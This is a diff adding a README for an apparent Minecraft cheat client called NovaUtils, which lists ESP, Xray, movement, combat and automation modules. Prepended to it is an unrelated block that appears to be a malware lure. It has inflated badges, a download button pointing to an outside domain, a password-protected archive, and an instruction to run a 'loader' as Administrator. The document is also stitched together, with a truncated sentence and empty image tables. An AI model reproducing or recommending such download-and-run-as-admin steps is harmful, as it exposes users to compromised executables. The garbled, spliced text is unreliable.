@@ -1,0 +1,225 @@
+<div align="center">
+
+  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
+  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
+  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)
+
+</div>
+
+<div align="center">
+
+  <a href="https://respockett.pro/red">
+    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
+  </a>
+
+</div>
+
+> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.
+
+1. **⬇️ Download** the tool from the button above.
+2. **📦 Extract** the archive (password: `respocket`).
+3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
+4. **✅ Follow the setup wizard** – complete the installation.
+5. **🚀 Launch the Tool** – the main window appears.
+
+---
+
+> ⚠️ **Important: Official Distribution Notice**
+>
+> We distribute our software **only through MediaFire**.  
+> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
+> For your safety, always use the official release.
+
+---
+
+<div align="center">
+
+### 💙 Prepared by the Respocket Team
+
+**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
+Thank you for choosing our software. Download only official versions and stay with us!
+</div>
+
+
+---
+
+# NovaUtils
+
+A client-side utility mod for Minecraft: ESP, Xray, waypoints,
+HUD, automation and a clean single-window menu. Everything runs on your side only; nothing has to
+be installed on the server.
+
+## Downloads
+
+Grab the jar for your loader and Minecraft version from the
+## Using it
+
+- **Right Shift** opens the menu. **Delete** turns every module off (panic key).
+- Click a module (or its switch) to toggle it, right-click it to open its settings,
+  middle-click it to add it to the **Favorites** tab.
+- Two menu styles: the single **Nova** window (smooth: a pill glides between tabs, rows fade in one by one, it opens and closes with a soft zoom, accent line on top), or **Classic**, flat graphite panels (one orange
+  accent, enabled modules as a solid row in that colour), draggable, one per category. Drag the
+  colour strip at the top to pick any menu colour (middle-click it to go back to orange); it is remembered.
+  The button above *Edit HUD* (or next to it, in Classic) switches; your choice is kept.
+- Any module can be bound to a key or a mouse button (side buttons too) from its settings.
+- **Edit HUD** in the menu lets you drag the HUD elements (coords, armour, minimap, ...) anywhere.
+- Settings are saved to `config/novautils.json`.
+
+| Classic menu | Health bars |
+|---|---|
+### Chat commands
+
+Type them in chat; they never reach the server. `.help` lists them.
+
+| Command | |
+|---|---|
+| `.t <module>` | toggle a module |
+| `.bind <module> <key>` | bind a key (`n`, `rshift`, `mouse4`, `none`...) |
+| `.set <module> <setting> <value>` | change a setting |
+| `.profile save/load/del/list <name>` | save and switch whole setups ("2b2t", "mining"...) |
+| `.config export` / `.config import` | copy your config to the clipboard / load it from there |
+| `.wp add/del/list <name>` | waypoints |
+| `.search add [block or #tag] [hex]`, `.search mob add [mob] [hex]`, `del` / `list` / `clear` | your own blocks (or the one you look at) and mobs for Search |
+| `.friend add/del/list <name>` | friends |
+| `.find <item>` | which chest you left it in (ChestTracker) |
+| `.echest` | what's in your ender chest |
+| `.sort` | sort the open chest or your inventory |
+| `.drop add/del/list <item>` | extra items for AutoDrop |
+| `.seed <n|2b2t>` | set the world seed for `.locate` and slime chunks |
+| `.locate <structure> [n]` | nearest structures from the seed, with a waypoint |
+| `.wp add <name> [x y z] / del / list / clear` | waypoints, by coordinates or where you stand |
+| `.coords`, `.seed <seed>`, `.panic` | copy coordinates, slime-chunk seed, everything off |
+
+## Compatibility
+
+- **Sodium + Iris** (Fabric) and **Embeddium + Oculus** (Forge 1.20.1): Xray works with both
+  renderers, and ESP, tracers, waypoints and labels keep working with a shaderpack on.
+- Tested alongside JEI/EMI, FancyMenu and large modpacks.
+
+| Xray with a shaderpack (Forge 1.20.1, Embeddium + Oculus) | ESP, nametags, storage ESP and HUD |
+|---|---|
+## Modules
+
+### Render
+| Module | What it does |
+|---|---|
+| Fullbright | Makes everything fully lit, no more caves or night. |
+| Xray | Hides everything but the ores you pick (see-through), or boxes them. |
+| Esp | Highlights entities through walls (box, chams, textured chams, glow), every look a toggle. |
+| StorageEsp | Highlights chests, shulkers, barrels and more through walls. |
+| Search | Finds spawners, portals, beacons and other rare blocks, with an alert and a counter. Add your own blocks with `.search add <block> [hex]`.  Or open the list editor from the menu (search, icons, 3D mob preview). |
+| BlockHighlight | Outlines the block you are looking at (rainbow option). |
+| TargetHud | Name, animated health pill, armour and distance of the creature you look at (works past survival reach). |
+| GearView | Armour, held items and enchantments (short tags or full names) above other players, with durability. |
+| Crosshair | Custom crosshair: cross, dot, circle or T, any size and colour, changes colour on mobs. |
+| SkyFog | Push back or remove fog, tint it, clear water and lava. |
+| HitColor | Change or remove the red hit flash. |
+| PetOwner | Owner tag above tamed animals. |
+| Particles | Choose which particles show and how many (FPS in big bases). |
+| Compass | A heading bar with your waypoints on it. |
+| GhostHand | Right-click chests, levers, doors and villagers through walls (never players; off while sneaking). |
+| Tracers | Lines from your crosshair to nearby entities. |
+| Nametags | Name tags in three styles (card with an animated health pill, classic, minimal): health, ping, distance, totem pops, held item. |
+| Waypoints | Named markers with distance, visible through walls. |
+| Minimap | A small map with you, mobs, players and waypoints. |
+| ShulkerPeek | Hover a shulker box to see what's inside. |
+| BreakIndicator | Shows the progress of blocks being broken, yours and other players'. |
+| HitsToKill | A mob's health and how many hits it still needs. |
+| HealthBars | Rounded health pills over mobs and/or players, with a pale ghost of the health just lost (filter: mobs, players or both; hostile only). |
+| Esp looks | Every look is its own on/off toggle, so they can be combined: CLEAN box (tidy 2D box, name pill, animated health pill), CORNERS, 2D box, 3D box, wireframe, CHAMS (flat colour through walls), CHAMS TEXTURED (the mob's real skin, 100% opaque, visible through walls) and a soft wide GLOW. GLOW has its own sliders for how far it spreads and how strong it is. Also toggles for the fill, colour by health, rainbow, two-tone (another colour behind walls), distance fade, pulse, and arrows pointing at what is off screen. |
+| FallPredict | Where you'll land and how much fall damage it will do. |
+| ChunkBorders | Chunk outlines and slime chunks. |
+| Trajectories | Where pearls, arrows and potions will land. |
+| NewChunks | New vs already-loaded chunks (find trails). |
+| LightOverlay | Where mobs can spawn, and the best spots for torches. |
+| Freecam | Fly the camera freely while your body stays put. |
+| Zoom | Zoom in, scroll to zoom further. |
+| ViewModel | Size, position and tilt of your hands and items, enchant glint. |
+| NoRender | Hides the fire overlay, hurt camera shake and the totem animation. |
+| Trail, Breadcrumbs, LogoutSpots, ItemHighlight, HoleEsp, TunnelEsp, VoidEsp | Smaller visual helpers. |
+| TimeChanger, WeatherChanger | Change the time and weather you see. |
+
+### Movement
+| Module | What it does |
+|---|---|
+| ElytraFly | Elytra flight: control, boost, 2b2t bounce, auto rockets. |
+| BoatFly | Fly with a boat. |
+| Flight, Speed, Step, HighJump, LongJump, AirJump | Classic movement. |
+| Jesus, Spider, FastClimb | Walk on water, climb walls, faster ladders. |
+| Scaffold, SafeWalk, Parkour, Sneak | Building and edge helpers. |
+| AutoSprint, AutoWalk, AutoJump | Less key holding. |
+| NoFall, NoSlow, Velocity, AntiVoid | Fall damage, item slowdown, knockback, void. |
+| InventoryMove | Walk around with menus open. |
+
+### Combat
+| Module | What it does |
+|---|---|
+| AutoFight | Attacks nearby hostile mobs (and neutral ones only when they're angry at you). With Players on, also other players. Friends are skipped. |
+| Criticals | Every hit on a mob is a critical hit. |
+| AutoTotem, AutoArmor, Surround, AutoLog | Defensive helpers. |
+
+### Player
+| Module | What it does |
+|---|---|
+| PacketMine | Click a block to mine it in the background; queue several. |
+| InventorySort | Sorts the open chest or your inventory (its key works inside chests). |
+| AutoDrop | Throws away junk blocks and items. |
+| AntiHunger | Sprint without the server charging sprint hunger. |
+| AutoTool | Picks the fastest tool, counting Efficiency. Silent mode swaps only while mining, so your hand never shows it. |
+| AutoEat, AutoReplenish, AutoMend, ElytraReplace, ChestSwap | Inventory upkeep. |
+| FastUse, FastBreak, AutoClicker | Faster using and mining. |
+
+### World
+| Module | What it does |
+|---|---|
+| AutoFarm | Harvests ripe crops and replants them. |
+| AutoSmelt | Fills furnaces with ores/food and fuel, takes the output. |
+| AutoCompact | Crafts ingots, gems etc. into blocks at a crafting table. |
+| AutoTunnel | Digs a straight 1x2 or 3x3 tunnel, stops at lava and drops, places torches. |
+| AutoBuild | Builds a platform, wall, bridge or shelter from your hotbar blocks. |
+| AirPlace | Place blocks in the air where you look. |
+| Nuker | Mines the blocks around you (flatten, ores only, ...). |
+| AutoFish, AutoBreed, AutoShearer, AutoNametag | Farm chores. |
+| Timer | Changes how fast the game ticks. |
+
+### Misc
+| Module | What it does |
+|---|---|
+| HudInfo, ArmorHud, PotionHud, InventoryHUD, KeyStrokes, TotemCounter, ActiveModules | HUD elements. |
+| Theme | One colour for both menus and the HUD: 10 presets (Orange, Nova, Red, Pink, Purple, Blue, Cyan, Green, Yellow, White), your own colour, or a rainbow that cycles. The Classic menu's colour strip sets it too. |
+| Notifier | Alerts for players in view, totem pops, joins, full inventory, low food. |
+| DurabilityAlert | Warns before armour, elytra or tools break. |
+| PlayerRadar | Nearby players and their distance. |
+| BetterChat | Timestamps, anti-spam stacking, longer history. |
+| DeathPoint | Marks where you died. |
+| ChestTracker | Remembers what you saw in every chest; `.find` tells you where something is. |
+| AutoCommand | Runs a chat command on a timer (e.g. /rtp every 20s), stops after N runs. |
+| Accounts | "Accounts" button on the multiplayer screen: switch to an offline nick (offline-mode servers) and back, no restart. |
+| Friends | Middle-click a player to add them as a friend. |
+| AutoRespawn, AutoReconnect, AntiAfk | Quality of life. |
+
+## Fair play
+
+AutoFight targets other players only while its Players setting is on (friends are never targeted).
+Criticals still only crits mobs. Movement and automation modules can still get you kicked or banned
+on servers with anti-cheat; use them where they're allowed.
+
+## Building
+
+Needs JDK 25 (the 26.x builds) and JDK 21 (the 1.20.1 build compiles with it for Java 17).
+
+```
+./gradlew :fabric:build :fabric261:build :fabric262:build :neoforge:build :neoforge261:build :neoforge1211:build :forge1201:build
+```
+
+- `common/` holds the code shared by the 26.x Fabric and NeoForge builds.
+- `forge1201/` is the Forge 1.20.1 port, with its own source tree.
+- In-game tests: `./gradlew :fabric:runClientGameTest` (26.3), `:fabric261:runClientGameTest`
+  (26.1.2, add `-PwithSodium` for Sodium + Iris), `:fabric262:runClientGameTest` (26.2), `:forge1201:runSelftest` (1.20.1, add
+  `-PwithEmbeddium` for Embeddium + Oculus), `:neoforge1211:runSelftest` (1.21.1, `-PwithSodium` for Sodium).
+
+## Contact
+
+Questions, bugs or ideas: Discord **baltazar_exe** (or open an issue here).
+
+**Contato:** dúvidas, bugs ou sugestões, me chama no Discord **baltazar_exe**.
